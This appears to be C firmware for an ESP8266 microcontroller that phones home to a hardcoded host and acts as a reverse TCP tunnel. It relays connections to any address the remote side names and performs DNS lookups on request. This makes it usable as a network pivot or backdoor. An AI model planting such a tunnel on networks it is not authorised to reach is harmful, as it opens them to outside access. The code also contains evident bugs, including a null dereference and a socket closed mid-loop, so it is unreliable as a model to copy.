#include "reverse_tcp.h" 
#include <string.h>
#include "espressif/esp_common.h"
#include "FreeRTOS.h"
#include "task.h"
#include "lwip/dns.h"
#include "lwip/netdb.h"
#include "lwip/sockets.h"
#include "lwip/err.h"
#include "lwip/sys.h"
//#include <netdb.h>

#define BUFFER_SIZE 2048
#define R_HOST "192.168.43.240"
#define R_PORT 8080

char __attribute__((aligned(4))) buffer[BUFFER_SIZE + 1]; // +1 for null terminator


void set_dns() {
    ip_addr_t dns_ip;
    // Set the IP address of the DNS server
    IP_ADDR4(&dns_ip, 8, 8, 8, 8); // For example, Google's DNS server
    // Set the DNS server (DNS_MAX_SERVERS = 2 by default, so 0 or 1)
    dns_setserver(0, &dns_ip);
}



// void get_ip_from_domain(char *domain, char *ip_buffer) {
//     struct hostent *he;
//     struct in_addr **addr_list;
//     int i;

//     if ((he = gethostbyname(domain)) == NULL) {  
//         // get the host info
//         printf("gethostbyname\n");
//         return;
//     }

//     addr_list = (struct in_addr **)he->h_addr_list;

//     for(i = 0; addr_list[i] != NULL; i++) {
//         // Return the first one;
//         strcpy(ip_buffer , inet_ntoa(*addr_list[i]));
//         return;
//     }
// }


int create_socket(char *_server, int _port) {
  int sockfd;
  struct sockaddr_in serverSockAddr;
  struct hostent *serverHostEnt;
  long hostAddr;
  bzero(&serverSockAddr,sizeof(serverSockAddr));
  hostAddr = inet_addr(_server);
  if ( (long)hostAddr != (long)-1){
    printf("coppy! %ld\n",hostAddr);
    bcopy(&hostAddr,&serverSockAddr.sin_addr,sizeof(hostAddr));
  }
  else
  {
        printf("resolve!\n");
    serverHostEnt = gethostbyname(_server);
    if (serverHostEnt == NULL)
    {
      printf("gethost fail\n");
      return -1;
    }
    bcopy(serverHostEnt->h_addr,&serverSockAddr.sin_addr,serverHostEnt->h_length);
  }
  serverSockAddr.sin_port = htons(_port);
  serverSockAddr.sin_family = AF_INET;
  printf("Pre Conn %s:%d\n", _server, _port);
  if ( (sockfd = socket(AF_INET,SOCK_STREAM,0)) < 0) {
    printf("failed to create socket {%d}\n", sockfd);
    return -1;
  }
  
  if(connect( sockfd,
    (struct sockaddr *)&serverSockAddr,
              sizeof(serverSockAddr)) < 0 ) {
    printf("conection failed\n");
    close(sockfd); // Close the socket on failure
    return -1;
  }
  return sockfd;
}

void reverse_tcp_task(void *pvParameters) {
    int __attribute__((aligned(4))) remote;
    struct __attribute__((aligned(4))) sockaddr_in remote_addr;
    int __attribute__((aligned(4))) bytes_received;

    retr:

    // Create socket
    remote = create_socket(R_HOST, R_PORT);

    if(remote < 0) {
        printf("Could not connect to client {%d}\n", remote);
        vTaskDelay(1000);
        printf("RETR\n");
        goto retr;

    }

    printf("CONNECTED!!!\n\n");

    while (1) {
        printf("Waiting from remote\n");
        bytes_received = read(remote, buffer, BUFFER_SIZE);
        if (bytes_received <= 0) {
            break;
        }

        if (bytes_received < BUFFER_SIZE) { // Ensure we don't write past the end of the array
          buffer[bytes_received] = '\0';
        }
        printf("Received: %s\n", buffer);

        if (strncmp(buffer, "CONNECT", 7) == 0) {
            int __attribute__((aligned(4))) client;
            // struct sockaddr_in client_addr;
            char __attribute__((aligned(4))) *token;
            char __attribute__((aligned(4))) *ip;
            int __attribute__((aligned(4))) port;

            // client = socket(AF_INET, SOCK_STREAM, 0);
            // if (client == -1) {
            //     printf("Could not create client socket");
            //     return 1;
            // }

            token = strtok(buffer, " ");
            token = strtok(NULL, " ");
            ip = strtok(token, ":");
            port = atoi(strtok(NULL, ":"));

            // client_addr.sin_addr.s_addr = inet_addr(ip);
            // client_addr.sin_family = AF_INET;
            // client_addr.sin_port = htons(port);

            // if (connect(client, (struct sockaddr *)&client_addr, sizeof(client_addr)) < 0) {
            //     printf("Client connect error");
            //     return 1;
            // }

            client = create_socket(ip,port);

            if (client < 0){
              printf("FUCK CLINET\n");
              return 1;
            }

            printf("Client connected\n");

            while (1) {
                memset(buffer,0,BUFFER_SIZE);
                fd_set __attribute__((aligned(4))) read_fds;
                FD_ZERO(&read_fds);
                FD_SET(client, &read_fds);
                FD_SET(remote, &read_fds);

                if (select(FD_SETSIZE, &read_fds, NULL, NULL, NULL) == -1) {
                    printf("Select error");
                    return 1;
                }

                if (FD_ISSET(client, &read_fds)) {
                    bytes_received = read(client, buffer, BUFFER_SIZE);
                    if (bytes_received <= 0 || write(remote, buffer, bytes_received) <= 0) {
                        printf("FIRST break;\n");
                        memset(buffer,0,BUFFER_SIZE);
                        break;
                    }
                }

                if (FD_ISSET(remote, &read_fds)) {
                    bytes_received = read(remote, buffer, BUFFER_SIZE);
                    if (bytes_received <= 0 || strncmp(buffer, "CLOSE", 5) == 0 || write(client, buffer, bytes_received) <= 0) {
                        printf("Second break;\n");
                        memset(buffer,0,BUFFER_SIZE);
                        break;
                    }
                }
                
                //vTaskDelay(1 / portTICK_PERIOD_MS ); 
            }
            printf("Closing socket!\n");
            close(client);
        }else
        if (strncmp(buffer, "gDOMAIN", 7) == 0) {
            printf("domain! %d\n", LWIP_DNS);
            unsigned int szDomain;
            int sz_ip;
            printf("to read\n");
            read(remote, &szDomain, sizeof(szDomain));
            szDomain = ntohl(szDomain)+1; // prbly I forgot +1 for \00
            printf("strlen = %u\n", szDomain);
            char* domain = malloc(szDomain*sizeof(char)+1);
            read(remote, domain, szDomain);
            domain[szDomain/*not +1*/] = '\0'; // Ensure null termination
            printf("Looking up (%.*s)\n", szDomain, domain);

            struct hostent *host_info;
            char ip_buffer[INET_ADDRSTRLEN] = {0};

            host_info = gethostbyname(domain);


            free(domain); // !!!!!!!!!!!!!!!!!!!!!!!
            if (host_info == NULL) {
                printf("Failed to get host by name.\n");                
            }

            inet_ntop(AF_INET, (void *)host_info->h_addr_list[0], ip_buffer, sizeof(ip_buffer));

            printf("IP address: %s\n", ip_buffer);
            
            // sending strlen
            sz_ip = strlen(ip_buffer);
            printf("sz_ip = %d sz = %d\n", sz_ip, sizeof(sz_ip));
            write(remote, &sz_ip, sizeof(sz_ip)); // &sz_ip

            write(remote, &ip_buffer, strlen(ip_buffer));
        }
        close(remote);
        printf("Waiting to restart reading???\n");
        vTaskDelay(100 / portTICK_PERIOD_MS );
        
    }

    

    return 0;
}


void start_reverse_tcp(const char * _server, int _port) {
    set_dns();
    xTaskCreate(reverse_tcp_task, (const char *)"reverse_tcp_task", 512, NULL, 1, NULL);
}
